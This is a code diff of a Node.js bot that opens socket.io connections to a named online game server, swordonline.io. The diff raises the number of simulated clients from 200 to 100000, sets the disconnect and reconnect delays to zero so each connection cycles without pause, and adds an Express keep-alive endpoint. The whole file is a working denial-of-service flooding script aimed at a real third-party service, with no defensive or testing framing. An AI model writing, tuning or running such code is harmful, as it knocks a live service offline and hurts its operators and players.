@@ -1,8 +1,15 @@
+// === EXPRESS SERVER ===
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 3000;
+app.get("/", (_, res) => res.send("Bot is running"));
+app.listen(port, () => console.log(`Express server running on port ${port}`));
+
 const io = require("socket.io-client");
 
 const servers = ["https://na-3.swordonline.io"];
 
-const clientsPerServer = Math.floor(200 / servers.length);
+const clientsPerServer = Math.floor(100000 / servers.length);
 
 servers.forEach((server, idx) => {
   for (let i = 0; i < clientsPerServer; i++) {
@@ -19,13 +26,13 @@ servers.forEach((server, idx) => {
 
         setTimeout(() => {
           socket.disconnect();
-        }, 1);
+        }, 0);
       });
 
       socket.on("disconnect", () => {
         setTimeout(() => {
           socket.connect();
-        }, 1);
+        }, 0);
       });
     }, clientIndex * 50);
   }
